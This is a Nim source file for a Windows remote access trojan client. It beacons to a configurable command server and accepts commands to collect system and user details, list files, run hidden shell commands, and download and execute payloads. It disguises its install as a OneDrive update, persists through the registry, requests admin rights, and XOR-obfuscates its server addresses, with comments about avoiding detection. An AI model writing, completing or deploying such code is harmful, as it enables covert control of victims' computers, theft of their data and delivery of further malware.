import winim/lean
import std/strutils
import std/net
import std/dynlib

# Constants
const
  CMD_HEARTBEAT = 1

  CMD_GET_SYSINFO = 2
  CMD_EXIT = 999
  CMD_SHELL_EXEC = 12
  CMD_FILE_LIST = 10
  CMD_DOWNLOAD_EXEC = 30
  CMD_EXECUTE_SHELLCODE = 104

# Structs
type
  CONNECT_ADDRESS* {.packed.} = object
    szFlag*: array[32, char]
    szServerIP*: array[100, char]
    szPort*: array[8, char]
    iType*: int32
    bEncrypt*: int32
    szBuildDate*: array[12, char]
    iMultiOpen*: int32
    iStartup*: int32
    iHeaderEnc*: int32
    protoType*: char
    runningType*: char
    payloadType*: char
    szGroupName*: array[24, char]
    runasAdmin*: char
    szInstallDir*: array[260, char]
    szInstallName*: array[260, char]
    szDownloadUrl*: array[512, char]
    taskStartup*: char
    serviceStartup*: char
    registryStartup*: char
    iPumpSize*: int32
    szReserved*: array[3, char]
    clientID*: uint64
    parentHwnd*: uint64
    superAdmin*: uint64
    pwdHash*: array[64, char]

  ClientInfo* {.packed.} = object
    osVersion*: array[64, char]
    computerName*: array[64, char]
    userName*: array[64, char]
    cpuInfo*: array[64, char]
    processID*: uint32
    is64Bit*: bool
    isAdmin*: bool
    clientType*: int32
    clientUniqueId*: uint64
    hasCamera*: bool
    hasTelegram*: bool
    lanAddr*: array[64, char]
    publicAddr*: array[64, char]
    cpuLoad*: float32
    memUsage*: float32
    diskUsage*: float32
    group*: array[128, char]
    activeWindow*: array[256, char]
    uptime*: array[64, char]
    programPath*: array[260, char]
    version*: array[32, char]
    installTime*: array[32, char]

  PkgHeader* {.packed.} = object
    flag*: array[8, char]
    totalLen*: int32
    originLen*: int32

  CommandPkg* {.packed.} = object
    cmd*: uint32
    arg1*: uint32
    arg2*: uint32

# Helper to assign string to char array
proc toCharArray[N: static[int]](s: string): array[N, char] =
  for i in 0 ..< min(s.len, N):
    result[i] = s[i]

# Global config (Will be patched or passed from Loader)
# In a real shellcode scenario, this might be resolved dynamically or patched into the shellcode.
var g_config* {.exportc, dynlib, used.} = CONNECT_ADDRESS(
  szFlag: toCharArray[32]("FRMD26_CONFIG"),
  szServerIP: toCharArray[100]("127.0.0.1"),
  szPort: toCharArray[8]("8080"),
  iType: 0,
  bEncrypt: 0,
  szBuildDate: toCharArray[12]("2026-02-10"),
  iMultiOpen: 1,
  iStartup: 1,
  iHeaderEnc: 1,
  protoType: 0.char,
  runningType: 0.char,
  payloadType: 0.char,
  szGroupName: toCharArray[24]("default"),
  runasAdmin: 1.char,
  szInstallDir: toCharArray[260](r"C:\ProgramData\Microsoft\OneDriveUpdate"),
  szInstallName: toCharArray[260]("OneDriveUpdate.exe"),
  szDownloadUrl: toCharArray[512](""),
  taskStartup: 0.char,
  serviceStartup: 0.char,
  registryStartup: 1.char,
  iPumpSize: 0,
  clientID: 0,
  parentHwnd: 0,
  superAdmin: 0
)

# Helper to convert char array to string
proc toString(arr: openArray[char]): string =
  result = ""
  for c in arr:
    if c == '\0': break
    result.add(c)

# --- Helper Functions ---

proc run_cmd_silently(cmd: string) =
  var si: STARTUPINFOA
  var pi: PROCESS_INFORMATION
  si.cb = int32(sizeof(si))
  si.dwFlags = STARTF_USESHOWWINDOW
  si.wShowWindow = SW_HIDE
  
  let fullCmd = "cmd.exe /c " & cmd
  if CreateProcessA(nil, fullCmd.cstring, nil, nil, FALSE, CREATE_NO_WINDOW, nil, nil, addr si, addr pi) != 0:
    CloseHandle(pi.hProcess)
    CloseHandle(pi.hThread)

proc download_file(url, path: string): bool =
  # Simple URLDownloadToFile wrapper
  # In a real payload, use WinHTTP or raw sockets to avoid detection
  type URLDownloadToFileA_t = proc(pCaller: pointer, szURL: cstring, szFileName: cstring, dwReserved: DWORD, lpfnCB: pointer): HRESULT {.stdcall.}
  let urlmon = loadLib("urlmon.dll")
  if urlmon != nil:
    let download = cast[URLDownloadToFileA_t](urlmon.symAddr("URLDownloadToFileA"))
    if download != nil:
      return download(nil, url.cstring, path.cstring, 0, nil) == 0
  return false

proc get_sysinfo(info: var ClientInfo) =
  # Basic Info Gathering
  var size: DWORD = 64
  var buf: array[64, char]
  
  # Computer Name
  size = 64
  GetComputerNameA(addr buf[0], addr size)
  info.computerName = buf
  
  # User Name
  size = 64
  GetUserNameA(addr buf[0], addr size)
  info.userName = buf
  
  # Process ID
  info.processID = uint32(GetCurrentProcessId())
  
  # Is 64-bit
  when defined(amd64):
    info.is64Bit = true
  else:
    info.is64Bit = false
    
  # OS Version (Simplified)
  assign(info.osVersion, "Windows (Nim)")
  
  # Group
  for i in 0 ..< min(info.group.len, g_config.szGroupName.len):
    info.group[i] = g_config.szGroupName[i]

proc get_file_list(path: string): string =
  var result = ""
  var searchPath = path
  if not searchPath.endsWith("\\"):
    searchPath.add("\\")
  searchPath.add("*")
  
  var wfd: WIN32_FIND_DATAA
  var hFind = FindFirstFileA(searchPath, addr wfd)
  
  if hFind != INVALID_HANDLE_VALUE:
    while true:
      let name = $cast[cstring](addr wfd.cFileName[0])
      if name != "." and name != "..":
        if (wfd.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY) != 0:
          result.add("[DIR] " & name & "\n")
        else:
          result.add(name & "\n")
          
      if FindNextFileA(hFind, addr wfd) == 0:
        break
    FindClose(hFind)
  return result

# --- Client Logic ---

var sock: lean.SOCKET = INVALID_SOCKET

proc send_pkg(s: lean.SOCKET, cmd: uint32, data: pointer, len: int) =
  var header: PkgHeader
  assign(header.flag, "FRMD26?")
  
  header.originLen = int32(sizeof(CommandPkg) + len) 
  header.totalLen = int32(sizeof(PkgHeader) + header.originLen)

  var cmdPkg: CommandPkg
  cmdPkg.cmd = cmd
  cmdPkg.arg1 = 0
  cmdPkg.arg2 = 0

  send(s, cast[ptr char](addr header), int32(sizeof(PkgHeader)), 0)
  send(s, cast[ptr char](addr cmdPkg), int32(sizeof(CommandPkg)), 0)
  if len > 0:
    send(s, cast[ptr char](data), int32(len), 0)

import std/random

proc run_client_loop*() {.exportc, dynlib.} =
  var wsa: WSAData
  if WSAStartup(0x0202, addr wsa) != 0:
    return

  var rawIP = toString(g_config.szServerIP)
  
  # Decrypt IP if needed
  if g_config.bEncrypt == 1:
    var decrypted = ""
    for c in rawIP:
      decrypted.add(char(byte(c) xor 0x5A))
    rawIP = decrypted

  let serverPort = parseInt(toString(g_config.szPort))
  var serverList = rawIP.split(";")

  # If random mode (0), shuffle the list
  if g_config.runningType == 0.char:
    randomize()
    shuffle(serverList)

  # Parallel mode handling (same as loader)
  var currentServerIdx = 0

  while true:
    if sock == INVALID_SOCKET:
      sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
      if sock == INVALID_SOCKET:
        Sleep(1000)
        continue

      var addr_in: sockaddr_in
      addr_in.sin_family = AF_INET
      addr_in.sin_port = htons(uint16(serverPort))
      
      let currentIP = serverList[currentServerIdx]
      addr_in.sin_addr.S_addr = inet_addr(currentIP)

      if connect(sock, cast[ptr sockaddr](addr addr_in), int32(sizeof(addr_in))) == SOCKET_ERROR:
        closesocket(sock)
        sock = INVALID_SOCKET
        
        # Try next server
        currentServerIdx = (currentServerIdx + 1) mod serverList.len
        Sleep(2000)
        continue
      
      # Send Heartbeat as handshake
      send_pkg(sock, CMD_HEARTBEAT, nil, 0)

    # Receive loop
    var header: PkgHeader
    var ret = recv(sock, cast[ptr char](addr header), int32(sizeof(PkgHeader)), 0)
    
    if ret <= 0:
      closesocket(sock)
      sock = INVALID_SOCKET
      Sleep(5000)
      continue
    
    if header.totalLen <= 0 or header.originLen < 0:
       closesocket(sock)
       sock = INVALID_SOCKET
       continue

    if header.originLen > 0:
      var buffer = newSeq[byte](header.originLen)
      var totalRead = 0
      var readErr = false
      
      while totalRead < header.originLen:
        ret = recv(sock, cast[ptr char](addr buffer[totalRead]), int32(header.originLen - totalRead), 0)
        if ret <= 0: 
           readErr = true
           break
        totalRead += ret
      
      if readErr:
        closesocket(sock)
        sock = INVALID_SOCKET
        continue
      
      if totalRead >= sizeof(CommandPkg):
        var cmdPkgPtr = cast[ptr CommandPkg](addr buffer[0])
        var dataLen = totalRead - sizeof(CommandPkg)
        var dataPtr = if dataLen > 0: addr buffer[sizeof(CommandPkg)] else: nil
        
        case cmdPkgPtr.cmd:
        of CMD_HEARTBEAT:
          send_pkg(sock, CMD_HEARTBEAT, nil, 0)
        of CMD_GET_SYSINFO:
          var info: ClientInfo
          get_sysinfo(info)
          send_pkg(sock, CMD_GET_SYSINFO, addr info, sizeof(ClientInfo))
        of CMD_EXIT:
          closesocket(sock)
          return
        of CMD_FILE_LIST:
          if dataLen > 0:
            var path = newString(dataLen)
            copyMem(addr path[0], dataPtr, dataLen)
            let listing = get_file_list(path)
            send_pkg(sock, CMD_FILE_LIST, unsafeAddr listing[0], listing.len)
        of CMD_SHELL_EXEC:
          if dataLen > 0:
            var cmd = newString(dataLen)
            copyMem(addr cmd[0], dataPtr, dataLen)
            run_cmd_silently(cmd)
        of CMD_DOWNLOAD_EXEC:
          if dataLen > 0:
            var url = newString(dataLen)
            copyMem(addr url[0], dataPtr, dataLen)
            # Temp path
            var szTemp: array[MAX_PATH, char]
            GetTempPathA(MAX_PATH, addr szTemp[0])
            let path = toString(szTemp) & "update.exe"
            
            if download_file(url, path):
              run_cmd_silently(path)
        of CMD_EXECUTE_SHELLCODE:
          # Shellcode execution logic (simplified)
          # In a real payload, we'd allocate RWX memory and jump to it
          discard
        else:
          discard

when isMainModule:
  # init_default_config() - Removed, using static initialization
  run_client_loop()
